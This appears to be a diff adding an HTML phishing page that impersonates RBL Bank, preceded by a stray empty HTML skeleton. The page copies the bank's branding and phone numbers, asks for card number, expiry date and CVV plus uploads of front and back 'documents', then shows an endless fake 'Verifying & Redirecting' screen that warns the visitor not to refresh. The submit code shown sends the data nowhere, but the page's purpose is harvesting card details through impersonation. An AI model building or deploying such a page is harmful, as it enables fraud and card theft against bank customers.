@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+  
+</body>
+
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBL Bank Credit Card Verification</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f6f9;
+        }
+        @keyframes spin-slow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-ring {
+            border-top-color: #1a2f5c;
+            border-right-color: #cc0000;
+            animation: spin-slow 1.2s linear infinite;
+        }
+    </style>
+</head>
+<body class="flex justify-center items-center min-h-screen bg-gray-100">
+
+    <!-- Mobile Container Wrapper -->
+    <div class="w-full max-w-md bg-white min-h-screen sm:min-h-[680px] sm:rounded-2xl shadow-xl flex flex-col justify-between overflow-hidden relative">
+
+        <div>
+            <!-- Top Blue Header -->
+            <header class="bg-[#1a2f5c] text-white px-4 py-3 flex items-center justify-between shadow-md">
+                <a href="#" class="text-lg hover:text-gray-300 transition" aria-label="Home">
+                    <i class="fa-solid fa-house"></i>
+                </a>
+                <h1 class="text-base sm:text-lg font-bold tracking-wider">RBL BANK CREDIT CARD</h1>
+                <button type="button" class="text-lg hover:text-gray-300 transition" aria-label="Menu">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+            </header>
+
+            <!-- PAGE 1: Form View -->
+            <main id="form-page" class="p-4 sm:p-6 space-y-5">
+                
+                <!-- Notification Banner -->
+                <div class="bg-[#eaf0f6] border border-[#d2e0f0] rounded-xl p-3.5 flex items-center justify-between text-[#1a2f5c] shadow-sm">
+                    <div class="flex items-start space-x-3">
+                        <div class="text-[#2563eb] text-xl mt-0.5">
+                            <i class="fa-solid fa-lightbulb"></i>
+                        </div>
+                        <div class="text-xs sm:text-sm">
+                            <p class="font-semibold text-[#1a2f5c]">Hello, RBL Bank Customer</p>
+                            <p class="text-gray-600">Complete your card details in a few simple steps</p>
+                        </div>
+                    </div>
+                    <div class="text-[#1a2f5c] font-bold text-sm">
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </div>
+                </div>
+
+                <!-- Logo & Branding Section -->
+                <div class="text-center space-y-1 pt-1">
+                    <div class="flex justify-center items-center space-x-2">
+                        <div class="flex items-center">
+                            <div class="relative w-8 h-8 flex items-center justify-center">
+                                <div class="absolute w-7 h-7 rounded-full border-4 border-[#cc0000] -left-1"></div>
+                                <div class="absolute w-7 h-7 rounded-full border-4 border-[#1a2f5c] -right-1"></div>
+                                <div class="absolute w-3 h-3 bg-[#1a2f5c] rounded-full"></div>
+                            </div>
+                            <span class="text-2xl sm:text-3xl font-extrabold tracking-tight text-[#1a2f5c] ml-2">RBL</span>
+                            <span class="text-2xl sm:text-3xl font-extrabold tracking-tight text-[#cc0000]">BANK</span>
+                        </div>
+                    </div>
+                    <p class="text-[11px] sm:text-xs text-gray-600 font-medium pt-1">
+                        Customer service: 02261156300 | Credit cards-cpl-c 0223232 27
+                    </p>
+                </div>
+
+                <!-- Form Element -->
+                <form id="card-form" class="space-y-5">
+                    <!-- Card Details Container -->
+                    <div class="border-2 border-[#1a2f5c] rounded-xl p-4 sm:p-5 bg-white shadow-sm space-y-4">
+                        <h2 class="text-center font-bold text-[#1a2f5c] text-base sm:text-lg tracking-wide border-b border-gray-100 pb-2">
+                            RBL Debit/Credit Card
+                        </h2>
+
+                        <!-- Credit Card Number Field -->
+                        <div class="space-y-1">
+                            <label class="block text-[11px] sm:text-xs font-bold text-gray-700 tracking-wider">
+                                CREDIT CARD NUMBER
+                            </label>
+                            <div class="flex items-center border-b border-gray-400 py-2 focus-within:border-[#1a2f5c]">
+                                <span class="text-[#1a2f5c] mr-3 text-lg">
+                                    <i class="fa-regular fa-credit-card"></i>
+                                </span>
+                                <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required
+                                    class="w-full bg-transparent text-gray-700 placeholder-gray-400 focus:outline-none text-sm sm:text-base tracking-widest font-medium">
+                            </div>
+                        </div>
+
+                        <!-- Expiry Date & CVV Row -->
+                        <div class="grid grid-cols-2 gap-6 pt-1">
+                            <!-- Expiry Date -->
+                            <div class="space-y-1">
+                                <label class="block text-[11px] sm:text-xs font-bold text-gray-700 tracking-wider">
+                                    EXPIRY DATE
+                                </label>
+                                <div class="flex items-center border-b border-gray-400 py-2 focus-within:border-[#1a2f5c]">
+                                    <span class="text-[#1a2f5c] mr-3 text-base">
+                                        <i class="fa-regular fa-calendar"></i>
+                                    </span>
+                                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required
+                                        class="w-full bg-transparent text-gray-700 placeholder-gray-400 focus:outline-none text-sm sm:text-base tracking-wider font-medium">
+                                </div>
+                            </div>
+
+                            <!-- CVV -->
+                            <div class="space-y-1">
+                                <label class="block text-[11px] sm:text-xs font-bold text-gray-700 tracking-wider">
+                                    CVV
+                                </label>
+                                <div class="flex items-center border-b border-gray-400 py-2 focus-within:border-[#1a2f5c]">
+                                    <input type="password" id="cvv" placeholder="XXX" maxlength="4" required
+                                        class="w-full bg-transparent text-gray-700 placeholder-gray-400 focus:outline-none text-sm sm:text-base tracking-widest font-medium">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Document Upload Buttons -->
+                    <div class="space-y-3 pt-1">
+                        <input type="file" id="front-doc" class="hidden" accept="image/*,.pdf">
+                        <button type="button" onclick="document.getElementById('front-doc').click()" id="front-btn"
+                            class="w-full bg-[#edf2f7] hover:bg-[#e2e8f0] text-[#1a2f5c] font-bold py-3.5 px-4 rounded-xl shadow-sm border border-gray-200 transition text-xs sm:text-sm tracking-wide flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-upload"></i>
+                            <span id="front-btn-text">UPLOAD FRONT DOCUMENTS</span>
+                        </button>
+
+                        <input type="file" id="back-doc" class="hidden" accept="image/*,.pdf">
+                        <button type="button" onclick="document.getElementById('back-doc').click()" id="back-btn"
+                            class="w-full bg-[#edf2f7] hover:bg-[#e2e8f0] text-[#1a2f5c] font-bold py-3.5 px-4 rounded-xl shadow-sm border border-gray-200 transition text-xs sm:text-sm tracking-wide flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-upload"></i>
+                            <span id="back-btn-text">UPLOAD BACK DOCUMENTS</span>
+                        </button>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <div class="pt-2">
+                        <button type="submit" class="w-full bg-[#1a2f5c] hover:bg-[#142448] text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition text-sm sm:text-base tracking-wider">
+                            SUBMIT
+                        </button>
+                    </div>
+                </form>
+
+            </main>
+
+            <!-- PAGE 2: Submitted & Buffering View (Hidden by default) -->
+            <section id="buffering-page" class="hidden p-6 sm:p-8 flex flex-col items-center justify-center text-center space-y-6 min-h-[520px]">
+                
+                <!-- Brand Logo -->
+                <div class="flex items-center justify-center">
+                    <div class="relative w-8 h-8 flex items-center justify-center">
+                        <div class="absolute w-7 h-7 rounded-full border-4 border-[#cc0000] -left-1"></div>
+                        <div class="absolute w-7 h-7 rounded-full border-4 border-[#1a2f5c] -right-1"></div>
+                        <div class="absolute w-3 h-3 bg-[#1a2f5c] rounded-full"></div>
+                    </div>
+                    <span class="text-2xl font-extrabold tracking-tight text-[#1a2f5c] ml-2">RBL</span>
+                    <span class="text-2xl font-extrabold tracking-tight text-[#cc0000]">BANK</span>
+                </div>
+
+                <!-- Submitted Badge -->
+                <div class="bg-green-50 border border-green-200 text-green-800 px-4 py-2 rounded-full text-xs sm:text-sm font-semibold flex items-center space-x-2">
+                    <i class="fa-solid fa-circle-check text-green-600 text-base"></i>
+                    <span>Details Submitted Successfully</span>
+                </div>
+
+                <!-- Continuous Buffering Spinner -->
+                <div class="relative flex items-center justify-center my-4">
+                    <div class="w-20 h-20 border-4 border-gray-200 rounded-full loader-ring"></div>
+                    <div class="absolute text-[#1a2f5c] text-xl">
+                        <i class="fa-solid fa-shield-halved"></i>
+                    </div>
+                </div>
+
+                <!-- Status Text -->
+                <div class="space-y-2 max-w-xs">
+                    <h2 class="text-lg sm:text-xl font-bold text-[#1a2f5c]">
+                        Verifying & Redirecting...
+                    </h2>
+                    <p class="text-xs sm:text-sm text-gray-600 leading-relaxed">
+                        Your application has been submitted. Please wait while we verify your card details with our secure server.
+                    </p>
+                </div>
+
+                <!-- Animated Progress Bar & Elapsed Timer -->
+                <div class="w-full max-w-xs space-y-2 pt-2">
+                    <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+                        <div class="bg-[#1a2f5c] h-2 rounded-full w-2/3 animate-pulse"></div>
+                    </div>
+                    <div class="flex justify-between text-[11px] font-medium text-gray-500">
+                        <span>Processing request...</span>
+                        <span id="elapsed-timer">00:00</span>
+                    </div>
+                </div>
+
+                <!-- Warning Note -->
+                <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 text-[11px] text-amber-800 max-w-xs">
+                    <i class="fa-solid fa-triangle-exclamation mr-1"></i>
+                    Do not press the back button or refresh this page while verification is in progress.
+                </div>
+
+            </section>
+        </div>
+
+        <!-- Footer Disclaimer -->
+        <footer class="p-4 text-center text-[10px] sm:text-[11px] text-gray-500 leading-relaxed bg-white border-t border-gray-100">
+            By submitting, I confirm that I am an Indian above 18 years of age, residing in India and have read & agreed to RBL Bank Privacy Policy and T&C.
+        </footer>
+
+    </div>
+
+    <script>
+        // Format Credit Card Number with hyphens
+        const cardInput = document.getElementById('card-number');
+        cardInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = value.match(/.{1,4}/g);
+            e.target.value = formatted ? formatted.join('-') : '';
+        });
+
+        // Format Expiry Date as MM/YY
+        const expiryInput = document.getElementById('expiry-date');
+        expiryInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        // Show selected filename for Front Document
+        document.getElementById('front-doc').addEventListener('change', function (e) {
+            if (e.target.files.length > 0) {
+                document.getElementById('front-btn-text').textContent = 'FRONT: ' + e.target.files[0].name;
+                document.getElementById('front-btn').classList.add('border-green-500', 'bg-green-50', 'text-green-800');
+            }
+        });
+
+        // Show selected filename for Back Document
+        document.getElementById('back-doc').addEventListener('change', function (e) {
+            if (e.target.files.length > 0) {
+                document.getElementById('back-btn-text').textContent = 'BACK: ' + e.target.files[0].name;
+                document.getElementById('back-btn').classList.add('border-green-500', 'bg-green-50', 'text-green-800');
+            }
+        });
+
+        // Handle Form Submit -> Switch to Submitted & Continuous Buffering Screen
+        document.getElementById('card-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Hide Form Page & Show Buffering Page
+            document.getElementById('form-page').classList.add('hidden');
+            document.getElementById('buffering-page').classList.remove('hidden');
+
+            // Start continuous elapsed timer
+            let seconds = 0;
+            const timerDisplay = document.getElementById('elapsed-timer');
+            setInterval(function () {
+                seconds++;
+                const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const secs = String(seconds % 60).padStart(2, '0');
+                timerDisplay.textContent = `${mins}:${secs}`;
+            }, 1000);
+        });
+    </script>
+
+</body>
+</html>
+
